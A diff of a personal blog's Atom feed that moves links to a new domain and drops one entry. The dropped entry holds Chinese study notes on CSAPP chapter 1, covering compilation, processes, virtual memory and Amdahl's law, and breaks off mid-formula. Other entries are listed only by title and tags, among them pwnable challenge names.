     <updated>2021-06-03T13:22:49.791Z</updated>
     
@@ -309,19 +363,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>flag</title>
-    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/flag/"/>
-    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/flag/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/flag/"/>
+    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/flag/</id>
     <published>2021-06-03T12:30:19.589Z</published>
     <updated>2021-06-03T13:25:19.017Z</updated>
     
@@ -336,19 +390,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>bof</title>
-    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/bof/"/>
-    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/bof/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/bof/"/>
+    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/bof/</id>
     <published>2021-06-03T06:04:19.090Z</published>
     <updated>2021-06-03T12:30:13.409Z</updated>
     
@@ -363,19 +417,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>col</title>
-    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/col/"/>
-    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/col/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/col/"/>
+    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/col/</id>
     <published>2021-06-03T05:40:50.657Z</published>
     <updated>2021-06-03T12:29:58.229Z</updated>
     
@@ -390,19 +444,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>ruom0&#39;s daily</title>
-    <link href="https://ruom0.github.io/2021/06/03/ruom0_daily/"/>
-    <id>https://ruom0.github.io/2021/06/03/ruom0_daily/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/ruom0_daily/"/>
+    <id>https://www.ruomo.fun/2021/06/03/ruom0_daily/</id>
     <published>2021-06-03T05:32:45.978Z</published>
     <updated>2021-06-18T03:26:04.310Z</updated>
     
@@ -423,15 +477,15 @@
     
     
     
-    <category term="others" scheme="https://ruom0.github.io/categories/others/"/>
+    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
     
     
   </entry>
   
   <entry>
     <title>fd</title>
-    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/fd/"/>
-    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/fd/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/fd/"/>
+    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/fd/</id>
     <published>2021-06-03T05:13:44.568Z</published>
     <updated>2021-06-03T12:29:59.842Z</updated>
     
@@ -446,19 +500,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>用Pyenv安装多版本Python</title>
-    <link href="https://ruom0.github.io/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/"/>
-    <id>https://ruom0.github.io/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/</id>
+    <link href="https://www.ruomo.fun/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/"/>
+    <id>https://www.ruomo.fun/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/</id>
     <published>2021-06-02T06:50:36.106Z</published>
     <updated>2021-06-02T07:17:38.887Z</updated>
     
@@ -475,17 +529,17 @@
     
     
     
-    <category term="others" scheme="https://ruom0.github.io/categories/others/"/>
+    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
     
     
-    <category term="pyenv" scheme="https://ruom0.github.io/tags/pyenv/"/>
+    <category term="pyenv" scheme="https://www.ruomo.fun/tags/pyenv/"/>
     
   </entry>
   
   <entry>
     <title>第2章 信息的表示和处理</title>
-    <link href="https://ruom0.github.io/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/"/>
-    <id>https://ruom0.github.io/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/</id>
+    <link href="https://www.ruomo.fun/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/"/>
+    <id>https://www.ruomo.fun/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/</id>
     <published>2021-06-01T13:31:47.326Z</published>
     <updated>2021-06-08T07:55:35.023Z</updated>
     
@@ -502,36 +556,10 @@
     
     
     
-    <category term="csapp" scheme="https://ruom0.github.io/categories/csapp/"/>
+    <category term="csapp" scheme="https://www.ruomo.fun/categories/csapp/"/>
     
     
-    <category term="csapp" scheme="https://ruom0.github.io/tags/csapp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第1章 计算机系统漫游</title>
-    <link href="https://ruom0.github.io/2021/05/28/csapp/%E7%AC%AC1%E7%AB%A0_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/"/>
-    <id>https://ruom0.github.io/2021/05/28/csapp/%E7%AC%AC1%E7%AB%A0_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/</id>
-    <published>2021-05-28T09:14:20.927Z</published>
-    <updated>2021-06-04T10:36:57.774Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="程序编译过程">程序编译过程</h2><p>假设已有<code>hello.c</code>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> O; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>预处理阶段：预处理器（cpp）根据以字符<code>#</code>开头的命令，将<code>hello.c</code>文件中的头文件<code>stdio.h</code>的内容插入到程序文本中，得到新的源程序<code>hello.i</code>；</li><li>编译阶段：编译器（ccl）将<code>hello.i</code>文件翻译为<strong>文本文件</strong><code>hello.s</code>，其包含一个汇编语言程序；</li><li>汇编阶段：汇编器（as）将<code>hello.s</code>文件翻译成机器语言指令，并且把这些指令打包成<strong>可重定位目标程序</strong>的格式，最后将结果保存在<code>hello.o</code>文件中，其是一个二进制文件；</li><li>链接阶段：链接器（ld）会将我们之前生成的<code>hello.o</code>文件和其他<code>.o</code>文件进行合并，得到一个<strong>可执行目标文件</strong>。例如上述的程序存在标准C库中的<code>printf</code>函数，链接器在链接阶段会将<code>hello.o</code>和<code>printf.o</code>进行合并。</li></ul><hr><h2 id="系统硬件的组成">系统硬件的组成</h2><ul><li>总线</li><li>I/O设备（输入/输出设备）</li><li>主存，由一组动态随机存取存储器（DRAM）芯片组成</li><li>处理器（CPU），用于解释或执行存储在主存中的指令，主要有以下几个操作：<ul><li>加载：从主存复制一个字节或者一个字到寄存器，覆盖寄存器原来的内容；</li><li>存储：从寄存器中复制出一个字节或者一个字到主存的某个位置，覆盖主存该位置的原来内容；</li><li>操作：将两个寄存器的内容复制到ALU（算数/逻辑单元），ALU对这两个字做算术运算，并把结果放到一个寄存器中，覆盖寄存器原有内容；</li><li>跳转：从指令本身中抽取一个字，复制到程序计数器（PC）中，覆盖PC原有的值。</li></ul></li></ul><hr><h2 id="各种抽象表示">各种抽象表示</h2><h3 id="进程">进程</h3><p>进程是操作系统对一个正在运行的程序的一种抽象，同一个系统可以同时运行多个进程，每个进程都看似在独立地占用硬件。但是在任何一个时刻，处理器都只能够执行一个进程的代码。</p><p><strong>并发运行</strong>指的是一个进程地指令和另一个进程的指令是交错执行的。无论在单核还是多核系统中，一个CPU看上去就像是在并发执行多个进程，这种现象是通过处理器在进程之间切换实现的。在操作系统中将这种交错执行的机制成为<strong>上下文切换</strong>。</p><p><strong>上下文</strong>，即操作系统保持跟踪进程所需要的状态信息，包括PC和寄存器文件的当前值、主存内容等。由于在任意时刻单个处理器都只能执行一个进程的代码，因此当操作系统决定要把控制权转移到另一个进程时就会进行<strong>上下文切换</strong>，即保存当前进程的上下文、恢复新进程的上下文，然后将控制权转移给新进程。</p><h3 id="虚拟内存">虚拟内存</h3><p>虚拟内存为每个进程都提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致地，成为<strong>虚拟地址空间</strong>。在Linux进程中的虚拟地址空间如下图1所示。注意，图中的地址是从下往上增大的。</p><p><img src="/img/csapp/1/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="图1 进程地虚拟地址空间"></p><p>在Linux中，地址空间的最上部分是保留给操作系统中的代码和数据的，对所有进程来说都一样。每个进程看到的虚拟地址空间都由大量的准确定义的区构成，每个区都有其专门的功能。</p><ul><li>程序代码和数据。对所有进程来说，代码都是从同一固定地址开始的，紧接着是和C的<strong>全局变量</strong>相对应的数据位置。代码和数据区可直接按照可执行目标文件的内容初始化；</li><li>堆。代码和数据区后就是运行时的堆。代码和数据区在进程的一开始就已经被指定了大小，而当在调用如malloc、free这样的函数时，堆可以在运行时动态地扩展和收缩；</li><li>共享库。大约在地址空间的中间部分是一块用来存放像C标准库和数学库之类的共享库的代码和数据的区域；</li><li>栈。位于用户虚拟地址空间顶部的就是用户栈，编译器用它来实现函数的调用。和堆一样，用户栈可以动态地扩展和收缩。但和堆不同的时，栈是在调用一个函数时增长，从一个函数返回时收缩；</li><li>内核虚拟内存。地址空间顶部的区域保留给内核，不允许应用程序写这个区域的内容或者直接调用这个区域的函数。</li></ul><h3 id="文件">文件</h3><p>文件就是<strong>字节序</strong>。每个I/O设备，包括磁盘、键盘、显示器，甚至网络都可以看成是文件。系统中的所有输入和输出都是通过使用一小组成为Unix I/O的系统函数调用读写文件实现的。</p><hr><h2 id="系统之间利用网络通信">系统之间利用网络通信</h2><p>现代系统经常通过网络和其他系统连接在一起。</p><p>从单一系统来看，网络可以视为一个I/O设备，即网络适配器。当系统从主存复制一串字节到网络适配器时，数据流经过网络适配器传输到另一台机器。相似地，系统也可以通过网络适配器读取从其他机器发送过来的数据，并把数据复制到自己的主存。</p><hr><h2 id="重要主题">重要主题</h2><h3 id="Amdahl定律">Amdahl定律</h3><p>主要思想：当我们对系统的某个部分进行加速时，其对系统整体的性能的影响取决于该部分的重要性以及加速的程度。</p><p>若系统执行某应用程序需要花费的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">T_{old}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。假设系统某部分所需执行时间与该时间的比例为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span>，该部分性能提升比例为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。即该部分初始所需花费的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\alpha T_{old}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，现在所需的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><mi>k</mi></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\dfrac{\alpha T_{old}}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。因此，总的执行时间应为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>T</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><mo>+</mo><mfrac><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><mi>k</mi></mfrac><mo>=</mo><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><mo>+</mo><mfrac><mi>α</mi><mi>k</mi></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">T_{new} = (1 - \alpha)T_{old} + \frac{\alpha T_{old}}{k} = T_{old}[(1-\alpha) + \frac{\alpha}{k}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">]</span></span></span></span></span></p><p>由此可以计算得到加速比</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><mfrac><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><msub><mi>T</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><mo>+</mo><mfrac><mi>α</mi><mi>k</mi></mfrac></mrow></mfrac></mrow><annotation encoding="application/x-tex">S = \frac{T_{old}}{T_{new}} = \frac{1}{(1-\alpha) + \frac{\alpha}{k}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.19633em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.35244em;vertical-align:-1.0310000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span 